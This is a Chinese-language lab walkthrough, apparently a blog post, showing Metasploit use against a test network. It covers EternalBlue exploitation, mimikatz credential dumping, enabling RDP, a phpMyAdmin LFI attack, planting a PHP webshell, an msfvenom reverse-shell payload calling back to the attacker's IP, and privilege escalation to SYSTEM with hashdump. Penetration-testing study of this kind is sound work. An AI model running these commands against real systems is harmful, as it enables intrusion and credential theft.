## 写在前面

#### 最近学了学msf,学习了一些简单的模块使用以及渗透、提权、免 杀，并使用靶场进行了一次小小的实战，写篇文章记录下。

## MSF是什么

Metasploit是一个免费的、可下载的渗透测试框架，通过它可以很容易地获取、开发并对计算机软件漏洞

实施攻击。它本身附带数千个已知软件漏洞的专业级漏洞攻击工具，并且MSF团队始终在更新MSF的漏洞

库，这使得MSF始终充满生机。通俗的讲，MSF就是一个集成了渗透测试全流程的渗透工具，理论上讲，我们可以只依靠MSF完成从信息收集到最终的制作后门并清理入侵痕迹的渗透测试全过程。

## 组成部分

Auxiliary 辅助模块 为渗透测试信息搜集提供了大量的辅助模块支持Exploits 攻击模块
利用已知发现的安全漏洞或配置弱点对远程目标系统进行攻击，从而获得对远程目标系统访问权的代码组件。Payload 攻击载荷模块
攻击成功后使靶机运行的一段植入代码（往往是反弹shell）Post 后渗透攻击模块 攻击成功后的提权，留后门Encoders 编码模块
将攻击载荷（payload）进行编码，来绕过防护软件拦截

## 靶场实战一：探测网络主机并利用系统漏洞渗透

#### 本次渗透网络拓扑图：

![image](https://image.3001.net/images/20210402/1617366991_60670fcf6c0b0e75627be.png!small)

 **使用工具：MSF**

#### 开始渗透：

![image](https://image.3001.net/images/20210402/1617367032_60670ff821ccce2f3dc92.png!small)

首先分别在攻击机与受害机中分别查看IP

![image](https://image.3001.net/images/20210402/1617367044_6067100418025a8c6f9f2.png!small)

分别在受害机与攻击机中使用ping命令检查网络连通情况

![image](https://image.3001.net/images/20210402/1617367530_606711eae09ab101847dc.png!small)

![image](https://image.3001.net/images/20210402/1617367542_606711f6328292093fb4c.png!small)

使用

`service postgresql start`开启数据库

![image](https://image.3001.net/images/20210402/1617367601_606712312df398ed3186c.png!small)

使用

`msfdb init`初始化MSF数据库

![image](https://image.3001.net/images/20210402/1617367640_60671258c241c3ff261ca.png!small)

使用

`msfconsole`命令开启msf控制台

![image](https://image.3001.net/images/20210402/1617367700_60671294403437b1c62df.png!small)

使用

`db_status`检查数据库连接状态

![image](https://image.3001.net/images/20210402/1617367745_606712c1de9b0d2ebec63.png!small)

出现如图所示的回显证明连接成功

接下来，使用`nmap 192.168.119.132 -p
445`来对目标主机进行探测（因为笔者这里使用的MSF是最新版本，命令有所改变，老版的MSF命令应该为db_nmap）

![image](https://image.3001.net/images/20210402/1617367833_6067131970424810540cc.png!small)

根据结果可判断，目标主机的445端口是开启的，众所周知445端口通常开放的是Windows的共享服务，

曾经爆出过高危的漏洞永恒之蓝，所以接下来我们重点对目标主机是否存在永恒之蓝漏洞进行探测

使用`search ms17-010`命令来搜索MSF中有关永恒之蓝漏洞的模块

![image](https://image.3001.net/images/20210402/1617368305_606714f12687bf5080017.png!small)

如图所示，我们可以看到有一个专门用于扫描主机永恒之蓝漏洞的模块我们可以通过`use 模块名`或

`use 模块ID`的方式进行选中这里我采用的是第二种（因为懒。。。）

使用`use 1`命令进入永恒之蓝探测模块

![image](https://image.3001.net/images/20210402/1617368708_606716848945e02998259.png!small)

使用`options`命令查看此模块运行所需参数

![image](https://image.3001.net/images/20210402/1617369078_606717f6cd902ee747d52.png!small)

在Required这一栏中注明了是否需要用户自行设定参数

使用`set rhosts 192.168.119.132``set thread 2`命令分别设置目标主机IP与扫描线程

![image](https://image.3001.net/images/20210402/1617369338_606718fa751d3702687f0.png!small)设置完成后输入`run`或`exploit`开始运行扫描模块

![image](https://image.3001.net/images/20210402/1617369377_60671921a0086dc08fc4a.png!small)

如图所示，模块运行结果为：检测到目标主机中很有可能存在ms17-010也就是永恒之蓝漏洞接下来使用use命令进入永恒之蓝模块使用`show
payloads`命令查看该攻击模块可以使用的payload

![image](https://image.3001.net/images/20210405/1617625944_606b03581c170b11ac1a8.png!small)

这里我们选择常用的windows/x64/meterpreter_reverse_tcp作为此次攻击的payload

![image](https://image.3001.net/images/20210405/1617625954_606b036277c0da6ae260b.png!small)

使用`set payload 15`命令设置模块的payload使用show options 命令查看该模块运行所需自行设置的参数  
![image](https://image.3001.net/images/20210405/1617625982_606b037e47eae2f4d808d.png!small)

可以看到只有一个rhosts参数需要手动输入，其他参数模块已经默认设置好（关于payload的两个参数，由于笔者之前使用过这个payload所以参数是默认填好的，如果第一次使用lhost与lport参数是需要自行设置的，lhost就是就是在攻击机所监听的端口，注意这个端口不能被其他程序占用，设置为例如4444，5555，1234等端口都没问题。）设置好之后输入run命令开始自动攻击

![image](https://image.3001.net/images/20210405/1617626052_606b03c49fbc933e641c3.png!small)

![image](https://image.3001.net/images/20210405/1617626059_606b03cba5ca69c96c427.png!small)

可以看到MSF提示给了我们WIN字样，即成功，并反弹了一个meterpreter会话给用户输入`load mimikatz`或`load kiwi
`命令加载MSF内置的猕猴桃插件

![image](https://image.3001.net/images/20210406/1617692045_606c058d5ee2cafb1a7f6.png!small)

输入creds_Kerberos来抓取目标主机的用户密码（笔者的msf是msf6所以命令稍稍不同，如果是msf5的话命令为Kerberos）  
![image](https://image.3001.net/images/20210406/1617692052_606c0594dd166440d75cb.png!small)

可以看到我们已经成功抓取了目标主机administrator用户的明文密码但既然我们已经获得了管理员的明文密码，那么我们自然不能满足于一个小小的meterpreter会话了我们能否在目标主机上打开一个图形化的管理界面呢（也就是远程桌面RDP）？输入background命令把获得的meterpretr会话暂时放到后台

![image](https://image.3001.net/images/20210406/1617692061_606c059d773ae10768d73.png!small)

并使用nmap插件扫描一下目标主机的3389（远程桌面端口）有些令人失望的是，目标主机的3389默认是不开启的但这并不能阻挡我们一颗想要渗透的心（手动狗头~）还记得我们刚刚获得的meterpreter会话吗，msf内包含了一个可以依托会话打开主机端口的后渗透模块使用search
enable_rdp搜索一下看看

![image](https://image.3001.net/images/20210406/1617692068_606c05a42763ec3c62519.png!small)

输入`use
0`进入该模块并`options`看到只有一个需要填写的参数便是session的编号刚才使用background时可以看到msf把这个session标号为2所以使用`set
session 2`命令设置好参数输入`run`开启后渗透攻击

![image](https://image.3001.net/images/20210406/1617692076_606c05ac7094a84169369.png!small)

看到攻击成功字样后输入back退出后渗透模块并重新使用nmap扫描目标主机的3389端口

![image](https://image.3001.net/images/20210406/1617692082_606c05b27d7b44e28b11c.png!small)

可以看到不同，之前3389端口是不开启的，但现在经过后渗透模块的攻击已经显示开启接着输rdesktop 192.168.119.132
尝试远程桌面连接目标主机弹出密码窗口后输入刚刚我们使用猕猴桃抓取到的密码1234.a可以看到远程桌面成功打开至此，我们完成了靶场实战一  
![image](https://image.3001.net/images/20210406/1617692108_606c05cc4b80abe8f72ca.png!small)

## 靶场实战二：利用phpmyadmin lfi漏洞入侵并利用系统漏洞提权

#### 本次渗透网络拓扑图：

![image](https://image.3001.net/images/20210406/1617695714_606c13e2ce488d682497c.png!small)

### 环境搭建：

在实际的渗透情况中，web应用（除了某些数据库之外）大多数在服务器上运行的权限都不高，一般都是普通用户权限

因为一般来说web应用的运行并不需要高权限，还有web应用时暴露在公网之上的，任何人都可以访问得到，被入侵的概率自然也提高了，如果web应用在低权限下运行那么就可以尽量的减少被入侵后的损失，所以我们首先要构建一个·低权限的web应用首先开启phpstudy，点击系统服务并应用

![image](https://image.3001.net/images/20210406/1617693935_606c0cef47868dc4d882f.png!small)

可以在任务管理中看到默认情况下http服务在管理员的高权限下运行

![image](https://image.3001.net/images/20210406/1617693940_606c0cf44f6411a085a3b.png!small)

打开命令行输入`net user haixian 123456.a /add`添加一个普通权限的用户

![image](https://image.3001.net/images/20210406/1617693945_606c0cf98af8060a1903f.png!small)

![image](https://image.3001.net/images/20210406/1617693951_606c0cff51dfe886d5533.png!small)

打开服务，先停止apache2服务，然后点击属性，登录，此账户，浏览选中我们刚刚添加的用户haixian并把运行权限全都给它然后应用，确定

![image](https://image.3001.net/images/20210406/1617693956_606c0d04b27ae3e542298.png!small)

然后再找到phpstudy里apache文件夹中的log也就是日志文件夹，将这个文件夹也赋予给haixian这个用户

方法与上面类似

设置成功后打开任务管理器看到，现在的http服务已经运行在普通用户haixian下了

![image](https://image.3001.net/images/20210406/1617693964_606c0d0caa66b24954ae0.png!small)

![image](https://image.3001.net/images/20210406/1617693973_606c0d153ee2d5edb0090.png!small)

在攻击机中先用IP访问一下靶机的phpmyadmin保证网络访问畅通

![image](https://image.3001.net/images/20210406/1617693979_606c0d1b55d896ee5cb91.png!small)

然后打开msf输入`search phpmyadmin`搜索与phpmyadmin相关的模块

![image](https://image.3001.net/images/20210406/1617693998_606c0d2e2f42dfccfa717.png!small)

先选中暴破模块暴一下phpmyadmin的登陆密码，这里我并没有修改它的默认密码所以就用msf自带的小字典就行

![image](https://image.3001.net/images/20210406/1617694005_606c0d35d9975fc308283.png!small)

通过

`set rhosts 192.168.119.132`

`set targeturi /phpMyAdmin-4.8.1/`

`set userpass_file small.txt`

来设置模块运行所需参数，下一步就可以run了

但不幸的是，msf的这个暴破小模块并不是很好用并没有跑出来弱密码。但这不是重点，用burp一样可以跑出来所以接下来就默认已知phpmyadmin的登陆用户名密码

![image](https://image.3001.net/images/20210406/1617694016_606c0d4063f94211fe928.png!small)

使用use 命令进入phpmyadmin lfi 攻击模块

输入

    
    
    set rhosts 192.168.119.132
    
    set targeturi /phpMyAdmin-4.8.1/
    
    set password root

来设置好模块运行所需参数（这里没有设置payload因为msf6会默认帮你设置payload并采用之前的lhost与lport

若是msf5的话需要自行设置，注意这里的payload和实验一的不一样，因为是phpstudy搭建的环境所以要采用php的那个payload）输入run开启攻击

攻击成功后msf给用户反弹了一个meterpreter回来，但是这个会话和实验一获得的会话不一样，通过getuid命令可以看出，它的问题不只在于权限太低（可以通过shell窗口来尝试，发现连whoami都执行不了），输入hashdump居然回显Unknwn
command，很多命令执行不了（可以输入help命令来查看会话可以执行的命令），抓取不到主机哈希我们就无法进行票据攻击或者哈希传递等后渗透攻击，也就是说我们目前获得的是一个“残疾shell"

![image](https://image.3001.net/images/20210406/1617697861_606c1c4599bb66da6e6d4.png!small)

![image](https://image.3001.net/images/20210406/1617697896_606c1c685fbff92e73522.png!small)

![image](https://image.3001.net/images/20210406/1617697909_606c1c758b93df1aecacc.png!small)

![image](https://image.3001.net/images/20210406/1617697922_606c1c826eee9fb38358d.png!small)

所以我们要做的事有两件：

1.利用”残疾shell“上传一个”健康shell“

2.对”健康shell”进行提权

#### 方法一：通过webshell上传exp进行提权

首先在获得的会话中输入`vim 1.php`来在目标主机中生成1.php然后在其中写入一句话木马，如图

![image](https://image.3001.net/images/20210406/1617697929_606c1c890019c3fca4d5b.png!small)

使用dir命令查看木马位置

![image](https://image.3001.net/images/20210406/1617697936_606c1c90216c680262596.png!small)

测试连接，根据回显判断连接正常，命令执行也正常，接下来便用蚁剑连接

![image](https://image.3001.net/images/20210406/1617710840_606c4ef86042d4e0393bb.png!small)

![image](https://image.3001.net/images/20210406/1617694025_606c0d49a58ec714fc725.png!small)  
接下来便是使用蚁剑打开终端并通过systeminfo命令查看系统已经打过的补丁

在<https://bugs.hacking8.com/tiquan/>中输入全部的补丁号，网站便会给出可能会提权成功的exp，这个方法在笔者的文章[记一次由sql注入到拿下域控的渗透测试实战演练（上）](https://www.freebuf.com/articles/web/262820.html)中有详细应用但这个方法有个缺点，网站给出的提权补丁会有很多，我们需要把他们一个一个地下载下来并进行尝试（少则十几个，多

则上百个）一个一个的尝试非常浪费时间，并且最终不一定会有可以用的exp因为网站只是给出建议，如果测了半天一个能用的都没有那岂不是血亏？所以接下来介绍一个较为省时方法

#### 方法二：利用msf提权

msf有一个可以自动扫描目标主机可能存在的系统漏洞来进行提权补丁建议的模块

我们刚刚的meterpreter可以执行的命令太少，所以我们再上传一个新的木马来进行漏洞扫描

输入

    
    
    msfvenom -p windows/x64/meterpreter_reverse_tcp lhost=192.168.119.130 lport=1234 -f exe > haixian.exe

来生成一个可执行的木马文件，并利用原有的meterpreter会话的upload功能将其上传到目标主机

接下来输入

`use expolit/multi/handler`进入msf的监听模块

`set lhost 192.168.119.130`

`set lport 1234`

设置好监听参数后run开始监听

打开刚刚的meterpreter会话，输入

`execute -f haixian.exe`来使目标主机运行我们的木马文件

![image](https://image.3001.net/images/20210406/1617694347_606c0e8befd17575c1af3.png!small)

![image](https://image.3001.net/images/20210406/1617711530_606c51aa2f0f8aeefc124.png!small)

![image](https://image.3001.net/images/20210406/1617712672_606c5620a4dd2ae5f24cf.png!small)

回到我们的监听模块可以看到成功反弹了一个meterpreter给用户，再次输入hashdump发现现在只是单纯的提示权限不够了，上传”健康马”成功，接下来要对其进行提权

![image](https://image.3001.net/images/20210406/1617694375_606c0ea72a09ff6d4ee6e.png!small)

输入`search recon`命令查找该模块`use 0`进入该模块

options查看模块所需参数，发现只需要设置会话号也就是session就可以运行set session 1
设置参数（注意这里的会话号是“健康sherll”的）run开始扫描

![image](https://image.3001.net/images/20210406/1617694419_606c0ed318d6e1af55955.png!small)

根据结果可以看出一共有四个提权模块可供使用，就算挨个尝试，也不会花费太多时间，比起从网站上搜索exp的方法来是不是更加便捷呢？

经过笔者测试，最后一个提权模块是好用的，接下来进入，并设置相关参数,运行

`set payload windows/x64/meterpreter_reverse_tcp`

`options`

`set session 1`

`run`

![image](https://image.3001.net/images/20210406/1617695001_606c1119f1580fb0382c1.png!small)

结果显示提权成功，输入getuid查看当前权限，发现已经提升到了最高的system

输入hashdump，成功抓取目标主机哈希

![image](https://image.3001.net/images/20210406/1617695014_606c112656ac591eb96cf.png!small)

至此，我们完成了靶场实战二

## 写在后面

#### 此文为笔者作为一名渗透小白所写的学习记录，路过大神若有高见欢迎斧正

#### 下篇文章写免杀，敬请期待~~~

